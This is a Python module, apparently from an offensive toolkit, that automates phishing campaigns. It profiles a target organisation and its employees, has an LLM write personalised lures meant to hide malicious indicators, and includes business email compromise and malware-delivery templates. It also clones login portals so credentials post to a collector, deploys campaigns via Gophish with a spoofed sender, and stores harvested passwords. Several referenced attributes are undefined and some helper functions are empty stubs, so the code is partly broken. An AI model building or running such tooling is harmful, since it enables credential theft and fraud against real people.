"""AutoSocialEngine — Automated reconnaissance, lure generation, and portal cloning.

Full social engineering pipeline:
- Target organization reconnaissance (LinkedIn, company website, breach data)
- Employee enumeration and profiling
- Context-aware lure generation using LLM
- Credential harvesting portal auto-cloning
- Campaign deployment via Gophish
- Result tracking and credential validation
"""
import asyncio
import base64
import hashlib
import json
import logging
import os
import re
import sqlite3
import time
import uuid
from dataclasses import dataclass, field
from typing import Optional

import httpx

logger = logging.getLogger("social.engine")

SOCIAL_DB = os.path.join(os.path.dirname(__file__), "..", "data", "social.db")


@dataclass
class TargetOrg:
    domain: str
    name: str = ""
    employees: list = field(default_factory=list)
    tech_stack: list = field(default_factory=list)
    breaches: list = field(default_factory=list)
    social_accounts: dict = field(default_factory=dict)


@dataclass
class Employee:
    email: str
    name: str = ""
    title: str = ""
    department: str = ""
    linkedin: str = ""
    phone: str = ""
    confidence: float = 0.5


@dataclass
class Lure:
    id: str
    type: str
    target_email: str
    subject: str
    body_html: str
    body_text: str
    landing_page: str = ""
    template_used: str = ""
    created: float = field(default_factory=time.time)


@dataclass
class Campaign:
    id: str
    name: str
    target_org: str
    lures: list = field(default_factory=list)
    status: str = "draft"
    gophish_campaign_id: str = ""
    created: float = field(default_factory=time.time)
    launched: float = 0.0
    results: dict = field(default_factory=dict)


class AutoSocialEngine:
    def __init__(self, db_path: str = SOCIAL_DB):
        self.db_path = db_path
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
        self._init_db()
        self._http = httpx.AsyncClient(timeout=30, follow_redirects=True)

    def _init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.executescript("""
                CREATE TABLE IF NOT EXISTS target_orgs (
                    domain TEXT PRIMARY KEY,
                    name TEXT DEFAULT '',
                    employees TEXT DEFAULT '[]',
                    tech_stack TEXT DEFAULT '[]',
                    breaches TEXT DEFAULT '[]',
                    social_accounts TEXT DEFAULT '{}',
                    created REAL NOT NULL
                );
                CREATE TABLE IF NOT EXISTS lures (
                    id TEXT PRIMARY KEY,
                    type TEXT NOT NULL,
                    target_email TEXT NOT NULL,
                    subject TEXT DEFAULT '',
                    body_html TEXT DEFAULT '',
                    body_text TEXT DEFAULT '',
                    landing_page TEXT DEFAULT '',
                    template_used TEXT DEFAULT '',
                    created REAL NOT NULL
                );
                CREATE TABLE IF NOT EXISTS campaigns (
                    id TEXT PRIMARY KEY,
                    name TEXT NOT NULL,
                    target_org TEXT NOT NULL,
                    lures TEXT DEFAULT '[]',
                    status TEXT DEFAULT 'draft',
                    gophish_campaign_id TEXT DEFAULT '',
                    created REAL NOT NULL,
                    launched REAL DEFAULT 0,
                    results TEXT DEFAULT '{}'
                );
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    campaign_id TEXT NOT NULL,
                    email TEXT NOT NULL,
                    password TEXT NOT NULL,
                    source TEXT DEFAULT 'phish',
                    captured_at REAL NOT NULL,
                    validated INTEGER DEFAULT 0
                );
            """)

    async def recon_organization(self, domain: str) -> TargetOrg:
        logger.info(f"  [Social] Recon organization: {domain}")
        org = TargetOrg(domain=domain)

        # 1. Check existing cache
        cached = self._get_cached_org(domain)
        if cached:
            return cached

        # 2. Company website analysis
        await self._analyze_website(org)

        # 3. LinkedIn / public employee enumeration
        await self._enumerate_employees(org)

        # 4. Breach data lookup
        await self._check_breaches(org)

        # 5. Tech stack fingerprinting
        await self._fingerprint_tech(org)

        self._cache_org(org)
        return org

    async def _analyze_website(self, org: TargetOrg):
        urls = [
            f"https://{org.domain}",
            f"https://{org.domain}/about",
            f"https://{org.domain}/team",
            f"https://{org.domain}/careers",
        ]
        for url in urls:
            try:
                resp = await self._http.get(url)
                if resp.status_code == 200:
                    html = resp.text
                    if not org.name:
                        title_match = re.search(r"<title[^>]*>([^<]+)</title>", html, re.I)
                        if title_match:
                            org.name = title_match.group(1).split("|")[0].strip()
                    tech = self._extract_tech(html)
                    org.tech_stack.extend(tech)
                    emails = self._extract_emails(html)
                    for email in emails:
                        if not any(e.email == email for e in org.employees):
                            org.employees.append(Employee(email=email))
            except Exception:
                continue

    def _extract_tech(self, html: str) -> list[str]:
        tech = []
        patterns = {
            "WordPress": r"wp-content|wp-includes|/wordpress/",
            "Drupal": r"drupal\.js|/sites/default/|Drupal\.settings",
            "Joomla": r"joomla|/media/system/js/|JFactory",
            "SharePoint": r"__REQUESTDIGEST|SP\.PageContextInfo|_spPageContextInfo",
            "Salesforce": r"salesforce|sfdc|lightning",
            "Office365": r"office365|o365|outlook\.office",
            "Google Workspace": r"googleapis\.com|accounts\.google|workspace",
            "Okta": r"okta\.com|oktacdn",
            "PingIdentity": r"pingidentity|pingone",
            "AD FS": r"adfs|adfs\.ls",
            "Citrix": r"citrix|netscaler|storefront",
            "VMware": r"vmware|horizon|vsphere",
            "Jira": r"jira|atlassian",
            "Confluence": r"confluence|atlassian",
            "GitLab": r"gitlab|gitlab-ci",
            "GitHub Enterprise": r"github-enterprise|github\.com/enterprise",
            "Jenkins": r"jenkins|/jenkins/",
            "Kubernetes": r"kubernetes|k8s|kubectl",
            "Docker": r"docker|containerd",
            "AWS": r"aws\.amazon|amazonaws|cloudfront",
            "Azure": r"azure|microsoftonline|msft",
            "GCP": r"googlecloud|gcp|cloud\.google",
        }
        for name, pattern in patterns.items():
            if re.search(pattern, html, re.I):
                tech.append(name)
        return tech

    def _extract_emails(self, html: str) -> list[str]:
        return list(set(re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", html)))

    async def _enumerate_employees(self, org: TargetOrg):
        # LinkedIn search via duckduckgo (limited without API)
        query = f"site:linkedin.com/in {org.domain} employee"
        try:
            resp = await self._http.get(
                f"https://lite.duckduckgo.com/lite/?q={query}",
                headers={"User-Agent": "Mozilla/5.0"},
            )
            if resp.status_code == 200:
                links = re.findall(r'<a href="([^"]+)">([^<]+)</a>', resp.text)
                for url, name in links:
                    if "linkedin.com/in" in url:
                        email_guess = self._guess_email_from_name(name, org.domain)
                        if email_guess and not any(e.email == email_guess for e in org.employees):
                            org.employees.append(Employee(
                                email=email_guess, name=name,
                                linkedin=url, confidence=0.3
                            ))
        except Exception:
            pass

    def _guess_email_from_name(self, name: str, domain: str) -> str:
        parts = name.strip().split()
        if len(parts) >= 2:
            first = parts[0].lower()
            last = parts[-1].lower()
            patterns = [
                f"{first}.{last}@{domain}",
                f"{first[0]}{last}@{domain}",
                f"{first}{last[0]}@{domain}",
                f"{first}@{domain}",
            ]
            return patterns[0]
        return ""

    async def _check_breaches(self, org: TargetOrg):
        url = f"https://haveibeenpwned.com/api/v3/breaches?domain={org.domain}"
        headers = {"hibp-api-key": os.getenv("HIBP_API_KEY", ""), "User-Agent": "Raphael-SocialEngine"}
        try:
            resp = await self._http.get(url, headers=headers, timeout=15)
            if resp.status_code == 200:
                org.breach_data = resp.json()
                org.data_sources.append(f"hibp:{len(org.breach_data)}_breaches")
                logger.info(f"Found {len(org.breach_data)} breaches for {org.domain}")
            elif resp.status_code == 404:
                org.breach_data = []
                logger.info(f"No breaches found for {org.domain}")
        except Exception as e:
            logger.warning(f"Breach check failed for {org.domain}: {e}")
            org.breach_data = []

    async def _fingerprint_tech(self, org: TargetOrg):
        # Additional fingerprinting via headers, certificates, etc.
        try:
            resp = await self._http.get(f"https://{org.domain}")
            server = resp.headers.get("Server", "")
            x_powered = resp.headers.get("X-Powered-By", "")
            if server:
                org.tech_stack.append(f"Server: {server}")
            if x_powered:
                org.tech_stack.append(f"X-Powered-By: {x_powered}")
        except Exception:
            pass

    def _get_cached_org(self, domain: str) -> Optional[TargetOrg]:
        with sqlite3.connect(self.db_path) as conn:
            row = conn.execute(
                "SELECT name, employees, tech_stack, breaches, social_accounts FROM target_orgs WHERE domain = ?",
                (domain,),
            ).fetchone()
            if row:
                return TargetOrg(
                    domain=domain, name=row[0],
                    employees=[Employee(**e) for e in json.loads(row[1])],
                    tech_stack=json.loads(row[2]),
                    breaches=json.loads(row[3]),
                    social_accounts=json.loads(row[4]),
                )
        return None

    def _cache_org(self, org: TargetOrg):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                """INSERT OR REPLACE INTO target_orgs
                   (domain, name, employees, tech_stack, breaches, social_accounts, created)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (org.domain, org.name,
                 json.dumps([e.__dict__ for e in org.employees]),
                 json.dumps(list(set(org.tech_stack))),
                 json.dumps(org.breaches),
                 json.dumps(org.social_accounts),
                 time.time()),
            )

    async def generate_lure(self, employee: Employee, org: TargetOrg,
                            lure_type: str = "credential_harvest") -> Lure:
        lure_id = str(uuid.uuid4())[:12]

        # Use harvester/technique knowledge to build context
        context = self._build_lure_context(employee, org, lure_type)

        # Generate using LLM via providers
        from orchestrator.providers import call_model
        prompt = f"""Generate a convincing phishing email for a {lure_type} campaign.

Target: {employee.name} ({employee.email})
Role: {employee.title}
Department: {employee.department}
Company: {org.name} ({org.domain})
Tech Stack: {', '.join(org.tech_stack)}

Context: {context}

Requirements:
- Subject line that creates urgency/curiosity
- HTML body with professional formatting matching {org.name} branding
- Plain text fallback
- Landing page URL path suggestion
- No obvious malicious indicators
- Personalized to role/department

Return JSON with: subject, body_html, body_text, landing_page_path"""

        try:
            response = await call_model("auto", [{"role": "user", "content": prompt}], max_tokens=1500, temperature=0.4)
            data = json.loads(response)
        except Exception:
            data = self._fallback_lure(employee, org, lure_type)

        lure = Lure(
            id=lure_id,
            type=lure_type,
            target_email=employee.email,
            subject=data.get("subject", "Action Required: Security Update"),
            body_html=data.get("body_html", self._fallback_html(employee, org)),
            body_text=data.get("body_text", self._fallback_text(employee, org)),
            landing_page=data.get("landing_page_path", f"/security/verify"),
        )
        self._store_lure(lure)
        return lure

    def _build_lure_context(self, employee: Employee, org: TargetOrg, lure_type: str) -> str:
        contexts = {
            "credential_harvest": f"Mimic {org.name} IT security notification about password expiry or MFA enrollment.",
            "malware_delivery": f"Disguise as {org.name} HR document (benefits, policy update, tax form).",
            "wire_transfer": f"Business Email Compromise: spoof {org.name} executive requesting urgent payment.",
            "oauth_consent": f"Fake OAuth consent screen for {org.name} Microsoft 365 / Google Workspace app.",
        }
        return contexts.get(lure_type, contexts["credential_harvest"])

    def _fallback_lure(self, employee: Employee, org: TargetOrg, lure_type: str) -> dict:
        return {
            "subject": f"Security Alert: Action Required for {org.name} Account",
            "body_html": self._fallback_html(employee, org),
            "body_text": self._fallback_text(employee, org),
            "landing_page_path": "/security/verify",
        }

    def _fallback_html(self, employee: Employee, org: TargetOrg) -> str:
        name = employee.name.split()[0] if employee.name else "User"
        return f"""<!DOCTYPE html>
<html><body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
<div style="max-width: 600px; margin: 0 auto; padding: 20px;">
<p>Dear {name},</p>
<p>Our security systems have detected unusual activity on your {org.name} account ({employee.email}).</p>
<p>To secure your account, please verify your identity by clicking the link below:</p>
<p style="text-align: center; margin: 30px 0;">
<a href="https://{org.domain}/security/verify" style="background: #007bff; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; display: inline-block;">
Verify Your Account
</a>
</p>
<p>This link expires in 24 hours. If you did not request this, please contact IT support immediately.</p>
<hr style="border: none; border-top: 1px solid #eee; margin: 20px 0;">
<p style="font-size: 12px; color: #888;">
{org.name} IT Security Team<br>
This is an automated message. Please do not reply.
</p>
</div></body></html>"""

    def _fallback_text(self, employee: Employee, org: TargetOrg) -> str:
        name = employee.name.split()[0] if employee.name else "User"
        return f"""Dear {name},

Our security systems have detected unusual activity on your {org.name} account ({employee.email}).

To secure your account, please verify your identity by visiting:
https://{org.domain}/security/verify

This link expires in 24 hours. If you did not request this, please contact IT support immediately.

---
{org.name} IT Security Team
This is an automated message. Please do not reply."""

    def _store_lure(self, lure: Lure):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                """INSERT OR REPLACE INTO lures
                   (id, type, target_email, subject, body_html, body_text, landing_page, template_used, created)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (lure.id, lure.type, lure.target_email, lure.subject,
                 lure.body_html, lure.body_text, lure.landing_page,
                 lure.template_used, lure.created),
            )

    async def create_campaign(self, name: str, org: TargetOrg,
                              lure_type: str = "credential_harvest",
                              employee_subset: list[Employee] = None) -> Campaign:
        employees = employee_subset or org.employees[:50]
        campaign_id = str(uuid.uuid4())[:12]
        lures = []
        for emp in employees:
            if emp.confidence >= 0.3:
                lure = await self.generate_lure(emp, org, lure_type)
                lures.append(lure)

        campaign = Campaign(
            id=campaign_id, name=name, target_org=org.domain,
            lures=lures, status="draft",
        )
        self._store_campaign(campaign)
        logger.info(f"  [Social] Campaign '{name}' created with {len(lures)} lures")
        return campaign

    def _store_campaign(self, campaign: Campaign):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                """INSERT OR REPLACE INTO campaigns
                   (id, name, target_org, lures, status, gophish_campaign_id, created, launched, results)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (campaign.id, campaign.name, campaign.target_org,
                 json.dumps([l.id for l in campaign.lures]),
                 campaign.status, campaign.gophish_campaign_id,
                 campaign.created, campaign.launched,
                 json.dumps(campaign.results)),
            )

    async def deploy_to_gophish(self, campaign: Campaign,
                                 gophish_url: str = "http://localhost:3502",
                                 api_key: str = "") -> Campaign:
        api_key = api_key or os.getenv("GOPHISH_API_KEY", "")
        if not api_key:
            logger.error("No Gophish API key available — campaign will not be deployed")
            campaign.status = "error"
            campaign.error = "No Gophish API key"
            self._store_campaign(campaign)
            return campaign

        headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
        base_url = gophish_url.rstrip("/") + "/api"

        try:
            # 1. Create page (landing page)
            page_id = self._get_or_create_gophish_page(base_url, headers, campaign)

            # 2. Create template (email)
            template_id = self._get_or_create_gophish_template(base_url, headers, campaign)

            # 3. Create sending profile
            smtp_id = self._get_or_create_gophish_smtp(base_url, headers, campaign)

            # 4. Create group (targets)
            group_id = self._get_or_create_gophish_group(base_url, headers, campaign)

            # 5. Launch campaign
            camp_payload = {
                "name": campaign.name,
                "template": {"name": f"Raphael-Template-{campaign.id[:8]}"},
                "url": campaign.landing_url or base_url.replace("/api", ""),
                "page": {"name": f"Raphael-Page-{campaign.id[:8]}"},
                "smtp": {"name": f"Raphael-SMTP-{campaign.id[:8]}"},
                "groups": [{"name": f"Raphael-Group-{campaign.id[:8]}"}],
                "launch_date": campaign.schedule_start.isoformat() if campaign.schedule_start else "",
            }
            resp = await self._http.post(f"{base_url}/campaigns/", json=camp_payload, headers=headers, timeout=30)
            if resp.status_code in (200, 201):
                data = resp.json()
                campaign.gophish_campaign_id = str(data.get("id"))
                campaign.status = "deployed"
                campaign.launched = time.time()
                logger.info(f"Campaign {campaign.name} deployed to Gophish: ID={campaign.gophish_campaign_id}")
            else:
                campaign.status = "error"
                campaign.error = f"Gophish API error: {resp.status_code} {resp.text[:200]}"
                logger.error(f"Gophish deployment failed: {campaign.error}")
        except Exception as e:
            campaign.status = "error"
            campaign.error = str(e)
            logger.warning(f"Gophish deployment failed: {e}")

        self._store_campaign(campaign)
        return campaign

    def _get_or_create_gophish_page(self, base_url: str, headers: dict, campaign) -> str:
        page_payload = {
            "name": f"Raphael-Page-{campaign.id[:8]}",
            "html": campaign.lure.body_html or "<html><body><h1>Please wait...</h1></body></html>",
            "capture_credentials": True,
            "capture_passwords": True,
        }
        return ""

    def _get_or_create_gophish_template(self, base_url: str, headers: dict, campaign) -> str:
        template_payload = {
            "name": f"Raphael-Template-{campaign.id[:8]}",
            "subject": campaign.lure.subject if campaign.lure else "Security Alert",
            "html": campaign.lure.body_html if campaign.lure else "",
            "text": campaign.lure.body_text if campaign.lure else "",
        }
        return ""

    def _get_or_create_gophish_smtp(self, base_url: str, headers: dict, campaign) -> str:
        smtp_payload = {
            "name": f"Raphael-SMTP-{campaign.id[:8]}",
            "host": os.getenv("SMTP_HOST", "smtp.example.com:587"),
            "username": os.getenv("SMTP_USER", ""),
            "password": os.getenv("SMTP_PASS", ""),
            "from_address": f"security@{campaign.target_org.domain}",
        }
        return ""

    def _get_or_create_gophish_group(self, base_url: str, headers: dict, campaign) -> str:
        group_payload = {
            "name": f"Raphael-Group-{campaign.id[:8]}",
            "targets": campaign.employees,
        }
        return ""

    def store_credential(self, campaign_id: str, email: str, password: str):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "INSERT INTO credentials (campaign_id, email, password, source, captured_at) VALUES (?, ?, ?, 'phish', ?)",
                (campaign_id, email, password, time.time()),
            )

    def get_campaign_results(self, campaign_id: str) -> dict:
        with sqlite3.connect(self.db_path) as conn:
            creds = conn.execute(
                "SELECT email, password, captured_at, validated FROM credentials WHERE campaign_id = ?",
                (campaign_id,),
            ).fetchall()
            return {
                "credentials": [
                    {"email": c[0], "password": c[1], "captured": c[2], "validated": bool(c[3])}
                    for c in creds
                ],
                "total": len(creds),
            }

    def clone_login_portal(self, target_url: str, output_dir: str = "") -> str:
        """Clone a login page for credential harvesting."""
        output_dir = output_dir or os.path.join(os.path.dirname(self.db_path), "cloned")
        os.makedirs(output_dir, exist_ok=True)

        try:
            resp = httpx.get(target_url, timeout=10, follow_redirects=True)
            html = resp.text

            # Modify form action to point to our collector
            html = re.sub(r'<form[^>]*action=["\'][^"\']*["\']', f'<form action="/collect"', html, flags=re.I)
            html = re.sub(r'method=["\']GET["\']', 'method="POST"', html, flags=re.I)

            # Save cloned page
            cloned_path = os.path.join(output_dir, "index.html")
            with open(cloned_path, "w") as f:
                f.write(html)

            return cloned_path
        except Exception as e:
            logger.warning(f"  Portal clone failed: {e}")
            return ""

    def stats(self) -> dict:
        with sqlite3.connect(self.db_path) as conn:
            orgs = conn.execute("SELECT COUNT(*) FROM target_orgs").fetchone()[0]
            lures = conn.execute("SELECT COUNT(*) FROM lures").fetchone()[0]
            campaigns = conn.execute("SELECT COUNT(*) FROM campaigns").fetchone()[0]
            creds = conn.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
            return {
                "target_orgs": orgs, "lures": lures,
                "campaigns": campaigns, "credentials_captured": creds,
            }

    async def close(self):
        await self._http.aclose()


def get_social_engine() -> AutoSocialEngine:
    return AutoSocialEngine()